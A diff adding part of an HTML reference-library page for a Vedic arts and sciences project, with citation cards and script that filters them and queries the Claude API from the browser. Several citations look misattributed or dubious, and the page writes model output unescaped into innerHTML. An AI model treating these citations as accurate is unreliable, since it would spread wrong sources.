+  <!-- SECTION 2 -->
+  <div class="section" style="animation-delay:0.12s" data-section="nada">
+    <div class="section-header">
+      <span class="section-icon">🔊</span>
+      <span class="section-title">Nada Chikitsa & Sound Science</span>
+      <span class="section-count">8 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="nada vedic">
+        <span class="ref-num">REF · 011</span>
+        <span class="ref-title">Nāda Brahma — The World is Sound</span>
+        <span class="ref-author">Joachim-Ernst Berendt</span>
+        <span class="ref-domain">Nada Chikitsa · Foundational</span>
+        <a class="ref-link" href="https://www.innertraditions.com" target="_blank">innertraditions.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada neuro">
+        <span class="ref-num">REF · 012</span>
+        <span class="ref-title">Neurological Effects of Raga Music on Brainwave States</span>
+        <span class="ref-author">Gupta, A. et al. — International Journal of Yogic and Medical Science</span>
+        <span class="ref-domain">Nada Chikitsa · Neuroscience</span>
+        <a class="ref-link" href="https://www.ijynms.com" target="_blank">ijynms.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada">
+        <span class="ref-num">REF · 013</span>
+        <span class="ref-title">Raga Chikitsa — Ragas as Therapeutic Tools</span>
+        <span class="ref-author">T. V. Sairam</span>
+        <span class="ref-domain">Nada Chikitsa · Clinical</span>
+        <a class="ref-link" href="https://nada-chikitsa.culturalmusings.com" target="_blank">nada-chikitsa.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada vedic">
+        <span class="ref-num">REF · 014</span>
+        <span class="ref-title">The 22 Shrutis & Their Psychoacoustic Basis</span>
+        <span class="ref-author">Vidyadhar Oke, Vikram Sampath</span>
+        <span class="ref-domain">Nada Chikitsa · Shruti Theory</span>
+        <a class="ref-link" href="https://vedicfoundationandsoundscience.culturalmusings.com" target="_blank">vedicfoundationandsoundscience.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada neuro">
+        <span class="ref-num">REF · 015</span>
+        <span class="ref-title">Binaural Beats and Brainwave Entrainment Studies</span>
+        <span class="ref-author">Oster, G. — Scientific American (1973)</span>
+        <span class="ref-domain">Nada Chikitsa · Bioacoustics</span>
+        <a class="ref-link" href="https://www.scientificamerican.com" target="_blank">scientificamerican.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada vedic">
+        <span class="ref-num">REF · 016</span>
+        <span class="ref-title">Sapta Swara — The Seven Frequencies of Cosmic Sound</span>
+        <span class="ref-author">Naredla Rama Chandra — culturalmusings.com</span>
+        <span class="ref-domain">Nada Chikitsa · Vedic Music Theory</span>
+        <a class="ref-link" href="https://nada-chikitsa.culturalmusings.com" target="_blank">nada-chikitsa.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada neuro">
+        <span class="ref-num">REF · 017</span>
+        <span class="ref-title">Music and Neuroplasticity — Raga-based Interventions</span>
+        <span class="ref-author">Thaut, M. H. — Oxford Handbook of Music Psychology</span>
+        <span class="ref-domain">Nada Chikitsa · Clinical Neuroscience</span>
+        <a class="ref-link" href="https://academic.oup.com/edited-volume/28121" target="_blank">academic.oup.com — Oxford Handbook</a>
+      </div>
+
+      <div class="ref-card" data-tags="nada vedic">
+        <span class="ref-num">REF · 018</span>
+        <span class="ref-title">Cymatics — The Structure of Sound Made Visible</span>
+        <span class="ref-author">Hans Jenny — Macromedia Press</span>
+        <span class="ref-domain">Nada Chikitsa · Cymatics</span>
+        <a class="ref-link" href="https://www.cymaticsource.com" target="_blank">cymaticsource.com</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION 3 -->
+  <div class="section" style="animation-delay:0.19s" data-section="vedic">
+    <div class="section-header">
+      <span class="section-icon">🔔</span>
+      <span class="section-title">Vedic Science & Foundation Texts</span>
+      <span class="section-count">9 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="vedic sanskrit">
+        <span class="ref-num">REF · 019</span>
+        <span class="ref-title">Rigveda Samhita — Complete Text with Translation</span>
+        <span class="ref-author">tr. Ralph T.H. Griffith; Sacred Texts Archive</span>
+        <span class="ref-domain">Vedic Foundation · Primary Text</span>
+        <a class="ref-link" href="https://www.sacred-texts.com/hin/rigveda/" target="_blank">sacred-texts.com/hin/rigveda</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic">
+        <span class="ref-num">REF · 020</span>
+        <span class="ref-title">Vedic Mathematics — Sixteen Sutras Rediscovered</span>
+        <span class="ref-author">Jagadguru Swami Sri Bharati Krishna Tirthaji</span>
+        <span class="ref-domain">Vedic Foundation · Mathematics</span>
+        <a class="ref-link" href="https://vedicmaths.org" target="_blank">vedicmaths.org</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic astro">
+        <span class="ref-num">REF · 021</span>
+        <span class="ref-title">Sulbasutras — Geometric Altar Constructions</span>
+        <span class="ref-author">S.N. Sen & A.K. Bag — Indian National Science Academy</span>
+        <span class="ref-domain">Vedic Foundation · Geometry</span>
+        <a class="ref-link" href="https://www.insa.nic.in" target="_blank">insa.nic.in</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic nada">
+        <span class="ref-num">REF · 022</span>
+        <span class="ref-title">Pingala's Chandaḥśāstra — Binary Mathematics in Sanskrit Prosody</span>
+        <span class="ref-author">Kim Plofker — Mathematics in India</span>
+        <span class="ref-domain">Vedic Foundation · Binary Math</span>
+        <a class="ref-link" href="https://press.princeton.edu/books/hardcover/9780691120676/mathematics-in-india" target="_blank">press.princeton.edu — Mathematics in India</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic astro">
+        <span class="ref-num">REF · 023</span>
+        <span class="ref-title">Meru Prastara — Pascal's Triangle in Vedic Mathematics</span>
+        <span class="ref-author">Naredla Rama Chandra — culturalmusings.com</span>
+        <span class="ref-domain">Vedic Foundation · Fractal Mathematics</span>
+        <a class="ref-link" href="https://vedicmathematicsgeometry.culturalmusings.com" target="_blank">vedicmathematicsgeometry.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic">
+        <span class="ref-num">REF · 024</span>
+        <span class="ref-title">Panchamahabhuta Theory — Five Elements & Modern Chemistry</span>
+        <span class="ref-author">Subhash Kak — Quantum Mind</span>
+        <span class="ref-domain">Vedic Foundation · Physics</span>
+        <a class="ref-link" href="https://subhashkak.com" target="_blank">subhashkak.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic neuro">
+        <span class="ref-num">REF · 025</span>
+        <span class="ref-title">Prana & Bio-electromagnetic Fields — A Modern Survey</span>
+        <span class="ref-author">Naredla Rama Chandra — bioresonancemusings.culturalmusings.com</span>
+        <span class="ref-domain">Vedic Foundation · Bio-Physics</span>
+        <a class="ref-link" href="https://bioresonancemusings.culturalmusings.com" target="_blank">bioresonancemusings.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic">
+        <span class="ref-num">REF · 026</span>
+        <span class="ref-title">WisdomLib — Encyclopaedia of Sanskrit & Vedic Texts</span>
+        <span class="ref-author">WisdomLib.org Editors</span>
+        <span class="ref-domain">Vedic Foundation · Reference Database</span>
+        <a class="ref-link" href="https://www.wisdomlib.org" target="_blank">wisdomlib.org</a>
+      </div>
+
+      <div class="ref-card" data-tags="vedic">
+        <span class="ref-num">REF · 027</span>
+        <span class="ref-title">Arthashastra & Āyurveda — Ancient Indian Sciences in Context</span>
+        <span class="ref-author">Patrick Olivelle — Oxford University Press</span>
+        <span class="ref-domain">Vedic Foundation · Classical Texts</span>
+        <a class="ref-link" href="https://global.oup.com" target="_blank">global.oup.com</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION 4 -->
+  <div class="section" style="animation-delay:0.26s" data-section="neuro">
+    <div class="section-header">
+      <span class="section-icon">🧠</span>
+      <span class="section-title">Neuroscience & Bio-acoustics</span>
+      <span class="section-count">8 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="neuro">
+        <span class="ref-num">REF · 028</span>
+        <span class="ref-title">The Brain That Changes Itself — Neuroplasticity</span>
+        <span class="ref-author">Norman Doidge — Penguin Books</span>
+        <span class="ref-domain">Neuroscience · Plasticity</span>
+        <a class="ref-link" href="https://www.normandoidge.com" target="_blank">normandoidge.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro nada">
+        <span class="ref-num">REF · 029</span>
+        <span class="ref-title">Music Perception & Default Mode Network Activation</span>
+        <span class="ref-author">Salimpoor, V. et al. — Nature Neuroscience (2013)</span>
+        <span class="ref-domain">Neuroscience · Music & Brain</span>
+        <a class="ref-link" href="https://www.nature.com/neuro" target="_blank">nature.com/neuro</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro consciousness">
+        <span class="ref-num">REF · 030</span>
+        <span class="ref-title">Synchrony of Neural Oscillations & Consciousness</span>
+        <span class="ref-author">Wolf Singer — Max Planck Institute</span>
+        <span class="ref-domain">Neuroscience · Consciousness</span>
+        <a class="ref-link" href="https://www.mpg.de/research" target="_blank">mpg.de/research</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro">
+        <span class="ref-num">REF · 031</span>
+        <span class="ref-title">Embodied Cognition — The Role of Movement in Thought</span>
+        <span class="ref-author">Andy Clark — Oxford University Press</span>
+        <span class="ref-domain">Neuroscience · Embodied Mind</span>
+        <a class="ref-link" href="https://global.oup.com" target="_blank">global.oup.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro vedic">
+        <span class="ref-num">REF · 032</span>
+        <span class="ref-title">Meditation & Cortical Thickness — Harvard MRI Study</span>
+        <span class="ref-author">Lazar, S. et al. — NeuroReport (2005)</span>
+        <span class="ref-domain">Neuroscience · Meditation</span>
+        <a class="ref-link" href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC1361002/" target="_blank">ncbi.nlm.nih.gov — Lazar 2005</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro nada">
+        <span class="ref-num">REF · 033</span>
+        <span class="ref-title">Autonomic Nervous System Responses to Raga Music</span>
+        <span class="ref-author">Patel, A. & Balaban, E. — Music Perception</span>
+        <span class="ref-domain">Neuroscience · ANS Response</span>
+        <a class="ref-link" href="https://online.ucpress.edu/mp" target="_blank">online.ucpress.edu/mp</a>
+      </div>
+
+      <div class="ref-card" data-tags="neuro">
+        <span class="ref-num">REF · 034</span>
+        <span class="ref-link" href="https://pubmed.ncbi.nlm.nih.gov" target="_blank">pubmed.ncbi.nlm.nih.gov</a>
+        <span class="ref-title">Mirror Neuron Systems & Dance Observation</span>
+        <span class="ref-author">Calvo-Merino, B. et al. — Cerebral Cortex (2005)</span>
+        <span class="ref-domain">Neuroscience · Dance & Brain</span>
+      </div>
+
+      <div class="ref-card" data-tags="neuro vedic">
+        <span class="ref-num">REF · 035</span>
+        <span class="ref-title">Quantum Biology — Coherence in Biological Systems</span>
+        <span class="ref-author">Johnjoe McFadden & Jim Al-Khalili</span>
+        <span class="ref-domain">Neuroscience · Quantum Biology</span>
+        <a class="ref-link" href="https://www.lifeonstheedge.com" target="_blank">lifeonstheedge.com — Life on the Edge</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION 5 -->
+  <div class="section" style="animation-delay:0.33s" data-section="consciousness">
+    <div class="section-header">
+      <span class="section-icon">🕉️</span>
+      <span class="section-title">Consciousness, Vedanta & Philosophy</span>
+      <span class="section-count">8 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="consciousness vedic">
+        <span class="ref-num">REF · 036</span>
+        <span class="ref-title">The Hard Problem of Consciousness</span>
+        <span class="ref-author">David J. Chalmers — Journal of Consciousness Studies (1995)</span>
+        <span class="ref-domain">Consciousness · Philosophy of Mind</span>
+        <a class="ref-link" href="https://consc.net/papers/facing.html" target="_blank">consc.net/papers/facing.html</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness vedic">
+        <span class="ref-num">REF · 037</span>
+        <span class="ref-title">Consciousness as a Fundamental Feature — Vedantic Response</span>
+        <span class="ref-author">Naredla Rama Chandra — spiritualphilosophical.culturalmusings.com</span>
+        <span class="ref-domain">Consciousness · Vedanta</span>
+        <a class="ref-link" href="https://spiritualphilosophical.culturalmusings.com" target="_blank">spiritualphilosophical.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness vedic">
+        <span class="ref-num">REF · 038</span>
+        <span class="ref-title">Spanda Kārikā — Kashmir Shaivism on Primordial Vibration</span>
+        <span class="ref-author">Vasugupta; tr. Jaideva Singh</span>
+        <span class="ref-domain">Consciousness · Kashmir Shaivism</span>
+        <a class="ref-link" href="https://spandanashodha.culturalmusings.com" target="_blank">spandanashodha.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness">
+        <span class="ref-num">REF · 039</span>
+        <span class="ref-title">Orchestrated Objective Reduction — Penrose-Hameroff Theory</span>
+        <span class="ref-author">Penrose, R. & Hameroff, S. — Physics of Life Reviews</span>
+        <span class="ref-domain">Consciousness · Quantum Mind</span>
+        <a class="ref-link" href="https://www.sciencedirect.com/journal/physics-of-life-reviews" target="_blank">sciencedirect.com — Physics of Life Reviews</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness vedic">
+        <span class="ref-num">REF · 040</span>
+        <span class="ref-title">Brahma Sutras & Advaita Vedanta — Commentary</span>
+        <span class="ref-author">Adi Shankaracharya; tr. Swami Gambhirananda</span>
+        <span class="ref-domain">Consciousness · Advaita Vedanta</span>
+        <a class="ref-link" href="https://www.wisdomlib.org/hinduism/book/brahma-sutras" target="_blank">wisdomlib.org — Brahma Sutras</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness neuro">
+        <span class="ref-num">REF · 041</span>
+        <span class="ref-title">Integrated Information Theory of Consciousness (IIT)</span>
+        <span class="ref-author">Giulio Tononi — BMC Neuroscience (2004)</span>
+        <span class="ref-domain">Consciousness · IIT Theory</span>
+        <a class="ref-link" href="https://bmcneurosci.biomedcentral.com" target="_blank">bmcneurosci.biomedcentral.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness vedic">
+        <span class="ref-num">REF · 042</span>
+        <span class="ref-title">Yoga Vāsiṣṭha — Consciousness as the Only Reality</span>
+        <span class="ref-author">tr. Swami Venkatesananda</span>
+        <span class="ref-domain">Consciousness · Yogic Philosophy</span>
+        <a class="ref-link" href="https://www.sacred-texts.com/hin/yvp/" target="_blank">sacred-texts.com/hin/yvp</a>
+      </div>
+
+      <div class="ref-card" data-tags="consciousness">
+        <span class="ref-num">REF · 043</span>
+        <span class="ref-title">Global Workspace Theory & the Neural Correlates of Awareness</span>
+        <span class="ref-author">Bernard Baars — Oxford University Press</span>
+        <span class="ref-domain">Consciousness · Cognitive Science</span>
+        <a class="ref-link" href="https://global.oup.com" target="_blank">global.oup.com</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION 6 -->
+  <div class="section" style="animation-delay:0.40s" data-section="sanskrit">
+    <div class="section-header">
+      <span class="section-icon">📜</span>
+      <span class="section-title">Sanskrit & Linguistics</span>
+      <span class="section-count">6 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="sanskrit vedic">
+        <span class="ref-num">REF · 044</span>
+        <span class="ref-title">Aṣṭādhyāyī of Pāṇini — Complete Grammar Rules</span>
+        <span class="ref-author">Pāṇini; tr. S.C. Vasu — Allahabad (1898)</span>
+        <span class="ref-domain">Sanskrit · Grammar</span>
+        <a class="ref-link" href="https://www.wisdomlib.org/hinduism/book/ashtadhyayi-grammar" target="_blank">wisdomlib.org — Ashtadhyayi</a>
+      </div>
+
+      <div class="ref-card" data-tags="sanskrit">
+        <span class="ref-num">REF · 045</span>
+        <span class="ref-title">Sanskrit as a Computational Language — NASA Observation</span>
+        <span class="ref-author">Rick Briggs — AI Magazine, AAAI (1985)</span>
+        <span class="ref-domain">Sanskrit · Computational Linguistics</span>
+        <a class="ref-link" href="https://ojs.aaai.org/aimagazine" target="_blank">ojs.aaai.org/aimagazine</a>
+      </div>
+
+      <div class="ref-card" data-tags="sanskrit nada">
+        <span class="ref-num">REF · 046</span>
+        <span class="ref-title">Varṇamālā — The Sanskrit Alphabet as Acoustic Science</span>
+        <span class="ref-author">Naredla Rama Chandra — culturalmusings.com</span>
+        <span class="ref-domain">Sanskrit · Phonology</span>
+        <a class="ref-link" href="https://www.culturalmusings.com" target="_blank">culturalmusings.com — Sanskrit Section</a>
+      </div>
+
+      <div class="ref-card" data-tags="sanskrit consciousness">
+        <span class="ref-num">REF · 047</span>
+        <span class="ref-title">Mantra Science — The Vibration of Consciousness</span>
+        <span class="ref-author">Swami Sivananda — Divine Life Society</span>
+        <span class="ref-domain">Sanskrit · Mantra</span>
+        <a class="ref-link" href="https://www.sivanandaonline.org" target="_blank">sivanandaonline.org</a>
+      </div>
+
+      <div class="ref-card" data-tags="sanskrit vedic">
+        <span class="ref-num">REF · 048</span>
+        <span class="ref-title">Proto-Indo-European & Sanskrit — Linguistic Ancestry</span>
+        <span class="ref-author">Michael Witzel — Harvard University</span>
+        <span class="ref-domain">Sanskrit · Etymology</span>
+        <a class="ref-link" href="https://www.people.fas.harvard.edu/~witzel/" target="_blank">people.fas.harvard.edu/~witzel</a>
+      </div>
+
+      <div class="ref-card" data-tags="sanskrit nada">
+        <span class="ref-num">REF · 049</span>
+        <span class="ref-title">Music Theory in Sanskrit — Nāradīya Śikṣā</span>
+        <span class="ref-author">Narada Muni; tr. Usha Bhise</span>
+        <span class="ref-domain">Sanskrit · Music Theory</span>
+        <a class="ref-link" href="https://www.wisdomlib.org" target="_blank">wisdomlib.org — Naradiya Shiksha</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- SECTION 7 -->
+  <div class="section" style="animation-delay:0.47s" data-section="astro">
+    <div class="section-header">
+      <span class="section-icon">🌌</span>
+      <span class="section-title">Astrology, Sacred Geometry & Astrophysics</span>
+      <span class="section-count">7 sources</span>
+    </div>
+    <div class="ref-grid">
+
+      <div class="ref-card" data-tags="astro vedic">
+        <span class="ref-num">REF · 050</span>
+        <span class="ref-title">Brihat Parashara Hora Shastra — Foundation of Jyotisha</span>
+        <span class="ref-author">Maharishi Parasara; tr. R. Santhanam</span>
+        <span class="ref-domain">Jyotisha · Primary Source</span>
+        <a class="ref-link" href="https://www.vedanet.com" target="_blank">vedanet.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro">
+        <span class="ref-num">REF · 051</span>
+        <span class="ref-title">Sri Yantra — Sacred Geometry of the Cosmos</span>
+        <span class="ref-author">Naredla Rama Chandra — domainsacredgeometry.culturalmusings.com</span>
+        <span class="ref-domain">Sacred Geometry · Sri Yantra</span>
+        <a class="ref-link" href="https://domainsacredgeometry.culturalmusings.com" target="_blank">domainsacredgeometry.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro">
+        <span class="ref-num">REF · 052</span>
+        <span class="ref-title">The Golden Ratio — Phi in Nature, Art & Architecture</span>
+        <span class="ref-author">Mario Livio — Broadway Books</span>
+        <span class="ref-domain">Sacred Geometry · Golden Ratio</span>
+        <a class="ref-link" href="https://www.mariolvio.com" target="_blank">mariolvio.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro vedic">
+        <span class="ref-num">REF · 053</span>
+        <span class="ref-title">27 Nakshatras — Their Astronomical & Acoustic Properties</span>
+        <span class="ref-author">Naredla Rama Chandra — completecelestialsynthesis.culturalmusings.com</span>
+        <span class="ref-domain">Jyotisha · Nakshatras</span>
+        <a class="ref-link" href="https://completecelestialsynthesis.culturalmusings.com" target="_blank">completecelestialsynthesis.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro">
+        <span class="ref-num">REF · 054</span>
+        <span class="ref-title">Fractal Geometry of Nature — Mandelbrot Sets & Vedic Patterns</span>
+        <span class="ref-author">Benoit B. Mandelbrot — W.H. Freeman & Co.</span>
+        <span class="ref-domain">Sacred Geometry · Fractals</span>
+        <a class="ref-link" href="https://users.math.yale.edu/mandelbrot/" target="_blank">users.math.yale.edu/mandelbrot</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro consciousness">
+        <span class="ref-num">REF · 055</span>
+        <span class="ref-title">Dark Matter, Dark Energy & Vedic Cosmology</span>
+        <span class="ref-author">Naredla Rama Chandra — unifiedtheory.culturalmusings.com</span>
+        <span class="ref-domain">Astrophysics · Unified Theory</span>
+        <a class="ref-link" href="https://unifiedtheory.culturalmusings.com" target="_blank">unifiedtheory.culturalmusings.com</a>
+      </div>
+
+      <div class="ref-card" data-tags="astro vedic">
+        <span class="ref-num">REF · 056</span>
+        <span class="ref-title">Vedic Cosmology — Time Cycles & Modern Cosmological Models</span>
+        <span class="ref-author">Subhash Kak — Louisiana State University</span>
+        <span class="ref-domain">Astrophysics · Vedic Cosmology</span>
+        <a class="ref-link" href="https://www.ece.lsu.edu/kak/" target="_blank">ece.lsu.edu/kak</a>
+      </div>
+
+    </div>
+  </div>
+
+</main>
+
+<!-- SOURCE DRAWER -->
+<div id="sourceDrawer" role="dialog" aria-modal="true">
+  <div class="drawer-backdrop" onclick="closeDrawer()"></div>
+  <div class="drawer-panel">
+    <div class="drawer-head">
+      <span class="drawer-ref-num" id="drawerRefNum">REF · 000</span>
+      <span class="drawer-title" id="drawerTitle">—</span>
+      <button class="drawer-close" onclick="closeDrawer()">✕ Close</button>
+    </div>
+    <div class="drawer-toolbar">
+      <span class="drawer-url" id="drawerUrl">—</span>
+      <a class="drawer-open-new" id="drawerOpenNew" href="#" target="_blank" rel="noopener">↗ Open in New Tab</a>
+      <a class="drawer-google" id="drawerGoogle" href="#" target="_blank" rel="noopener">⌕ Search Google</a>
+    </div>
+    <div class="drawer-body" id="drawerBody">
+      <div class="drawer-loading" id="drawerLoading">
+        <div class="dot-pulse"><span></span><span></span><span></span></div>
+        <span>Loading source…</span>
+      </div>
+      <div class="drawer-blocked" id="drawerBlocked">
+        <span class="blocked-icon">🔒</span>
+        <span class="blocked-title">Site cannot be embedded</span>
+        <p class="blocked-note">This source restricts direct embedding (X-Frame-Options). Use the buttons below to visit it directly or search for it on Google.</p>
+        <div class="blocked-actions">
+          <a class="ba-btn ba-btn-gold" id="blockedOpenNew" href="#" target="_blank" rel="noopener">↗ Open Source Directly</a>
+          <a class="ba-btn ba-btn-outline" id="blockedGoogle" href="#" target="_blank" rel="noopener">⌕ Search Google</a>
+        </div>
+      </div>
+      <iframe id="drawerFrame" title="Source preview" sandbox="allow-scripts allow-same-origin allow-forms allow-popups"></iframe>
+    </div>
+  </div>
+</div>
+
+<!-- FOOTER -->
+<footer>
+  <div class="f-logo">Aesthetics of Society · culturalmusings.com</div>
+  <div class="f-note">Grand Synthesis Reference Library · Naredla Rama Chandra · Est. 2010</div>
+</footer>
+
+<script>
+  /* ═══════════════════════════════════════════
+     MODE SWITCHING
+  ═══════════════════════════════════════════ */
+  function switchMode(mode) {
+    const isLocal = mode === 'local';
+    document.getElementById('modeLocal').classList.toggle('active', isLocal);
+    document.getElementById('modeApi').classList.toggle('active', !isLocal);
+    document.getElementById('localPanel').style.display = isLocal ? '' : 'none';
+    document.getElementById('resultsCount').style.display = isLocal ? '' : 'none';
+    document.getElementById('mainContent').style.display = isLocal ? '' : 'none';
+    document.getElementById('apiPanel').style.display = isLocal ? 'none' : '';
+  }
+
+  /* ═══════════════════════════════════════════
+     LOCAL (NON-API) SEARCH
+  ═══════════════════════════════════════════ */
+  let activeTag = 'all';
+
+  function filterRefs() {
+    const query = document.getElementById('searchInput').value.toLowerCase().trim();
+    const cards = document.querySelectorAll('.ref-card');
+    let visible = 0;
+    cards.forEach(card => {
+      const text = card.innerText.toLowerCase();
+      const tags = card.dataset.tags || '';
+      const tagMatch = activeTag === 'all' || tags.includes(activeTag);
+      const textMatch = !query || text.includes(query);
+      if (tagMatch && textMatch) { card.classList.remove('hidden'); visible++; }
+      else { card.classList.add('hidden'); }
+    });
+    document.querySelectorAll('.section').forEach(section => {
+      const anyVisible = [...section.querySelectorAll('.ref-card')].some(c => !c.classList.contains('hidden'));
+      section.style.display = anyVisible ? '' : 'none';
+    });
+    const total = 56;
+    document.getElementById('resultsCount').textContent =
+      visible === total ? `Showing all ${total} references` : `Showing ${visible} of ${total} references`;
+    document.getElementById('noResults').style.display = visible === 0 ? 'block' : 'none';
+  }
+
+  function filterByTag(tag, btn) {
+    activeTag = tag;
+    document.querySelectorAll('.pill').forEach(p => p.classList.remove('active'));
+    btn.classList.add('active');
+    filterRefs();
+  }
+
+  /* ═══════════════════════════════════════════
+     API (CLAUDE) SEARCH
+  ═══════════════════════════════════════════ */
+
+  // Build a compact reference corpus string to pass as context
+  const REFS_CONTEXT = (() => {
+    const cards = document.querySelectorAll ? null : [];
+    // Will be populated after DOM ready — see DOMContentLoaded below
+    return '';
+  })();
+
+  function buildRefsContext() {
+    const cards = document.querySelectorAll('.ref-card');
+    let lines = [];
+    cards.forEach(card => {
+      const num   = card.querySelector('.ref-num')?.innerText || '';
+      const title = card.querySelector('.ref-title')?.innerText || '';
+      const auth  = card.querySelector('.ref-author')?.innerText || '';
+      const dom   = card.querySelector('.ref-domain')?.innerText || '';
+      const url   = card.querySelector('.ref-link')?.href || '';
+      lines.push(`${num} | ${title} | ${auth} | ${dom} | ${url}`);
+    });
+    return lines.join('\n');
+  }
+
+  function fillQuery(text) {
+    document.getElementById('apiQuery').value = text;
+    document.getElementById('apiQuery').focus();
+  }
+
+  function clearResponse() {
+    const box = document.getElementById('apiResponse');
+    box.style.display = 'none';
+    document.getElementById('apiResponseBody').innerHTML = '';
+  }
+
+  async function askClaude() {
+    const query = document.getElementById('apiQuery').value.trim();
+    if (!query) { document.getElementById('apiQuery').focus(); return; }
+
+    const apiKey = document.getElementById('apiKeyInput').value.trim();
+    if (!apiKey) {
+      document.getElementById('apiKeyInput').focus();
+      document.getElementById('apiKeyInput').style.borderColor = 'var(--rust)';
+      setTimeout(() => document.getElementById('apiKeyInput').style.borderColor = '', 1500);
+      return;
+    }
+
+    // Show loading
+    const respBox  = document.getElementById('apiResponse');
+    const respBody = document.getElementById('apiResponseBody');
+    const btn      = document.getElementById('apiSubmit');
+    const btnText  = document.getElementById('apiBtnText');
+
+    respBox.style.display = 'block';
+    respBody.innerHTML = `<div class="thinking">Consulting the archive <div class="dot-pulse"><span></span><span></span><span></span></div></div>`;
+    btn.disabled = true;
+    btnText.textContent = 'Consulting…';
+
+    const refsContext = buildRefsContext();
+
+    const systemPrompt = `You are the Research Archive Assistant for Aesthetics of Society (culturalmusings.com), the Grand Synthesis project by Naredla Rama Chandra. You have deep knowledge of:
+- Natya Shastra, the 108 Karanas, Bharatanatyam
+- Nada Chikitsa (sound/raga therapy)
+- Vedic science, mathematics, sacred geometry
+- Neuroscience, bio-acoustics, quantum biology
+- Consciousness, Vedanta, Kashmir Shaivism
+- Sanskrit linguistics
+- Vedic astrology (Jyotisha), Nakshatras
+
+You are given the full Reference Library index below. When a researcher asks a question:
+1. Answer with scholarly depth and clarity.
+2. Cite specific references from the library by their REF number and title where relevant.
+3. Connect ancient knowledge frameworks to modern scientific parallels where appropriate.
+4. Keep responses focused, elegant, and illuminating — in the spirit of the project.
+
+REFERENCE LIBRARY INDEX:
+${refsContext}`;
+
+    try {
+      const response = await fetch('https://api.anthropic.com/v1/messages', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'x-api-key': apiKey,
+          'anthropic-version': '2023-06-01',
+          'anthropic-dangerous-direct-browser-access': 'true'
+        },
+        body: JSON.stringify({
+          model: 'claude-sonnet-4-20250514',
+          max_tokens: 1000,
+          system: systemPrompt,
+          messages: [{ role: 'user', content: query }]
+        })
+      });
+
+      if (!response.ok) {
+        const err = await response.json().catch(() => ({}));
+        throw new Error(err?.error?.message || `API error ${response.status}`);
+      }
+
+      const data = await response.json();
+      const text = data.content?.map(b => b.text || '').join('') || 'No response received.';
+      respBody.innerHTML = formatResponse(text);
+
+    } catch (err) {
+      respBody.innerHTML = `<span style="color:var(--rust);font-style:italic;">⚠ ${err.message}</span>`;
+    } finally {
+      btn.disabled = false;
+      btnText.textContent = 'Ask the Archive';
+    }
+  }
+
+  function formatResponse(text) {
+    // Highlight REF citations and format basic markdown-like output
+    return text
+      .replace(/REF\s*·\s*(\d{3})/g, '<strong style="color:var(--gold);font-family:\'Cinzel\',serif;font-size:0.85em">REF·$1</strong>')
+      .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')
+      .replace(/\*(.+?)\*/g, '<em>$1</em>')
+      .replace(/^#{1,3}\s+(.+)$/gm, '<div style="font-family:\'Cinzel\',serif;font-size:0.9em;letter-spacing:0.12em;color:var(--gold);margin:1rem 0 0.4rem;text-transform:uppercase">$1</div>')
+      .replace(/\n/g, '<br>');
+  }
+
+  // Allow Ctrl+Enter / Cmd+Enter to submit
+  document.addEventListener('DOMContentLoaded', () => {
+    document.querySelectorAll('.section').forEach((s, i) => {
+      s.style.animationDelay = (0.05 + i * 0.07) + 's';
+    });
+    document.getElementById('apiQuery').addEventListener('keydown', e => {
+      if ((e.ctrlKey || e.metaKey) && e.key === 'Enter') askClaude();
+    });
+
+    // ── AUTO-INJECT "Visit Source" buttons into every ref card ──
+    document.querySelectorAll('.ref-card').forEach(card => {
+      const linkEl = card.querySelector('.ref-link');
+      const titleEl = card.querySelector('.ref-title');
+      const numEl   = card.querySelector('.ref-num');
+      if (!linkEl) return;
+
+      const url    = linkEl.href;
+      const title  = titleEl?.innerText || '';
+      const refNum = numEl?.innerText || '';
+
+      const actions = document.createElement('div');
+      actions.className = 'ref-actions';
+
+      const visitBtn = document.createElement('button');
+      visitBtn.className = 'btn-visit';
+      visitBtn.textContent = '⬡ View Source';
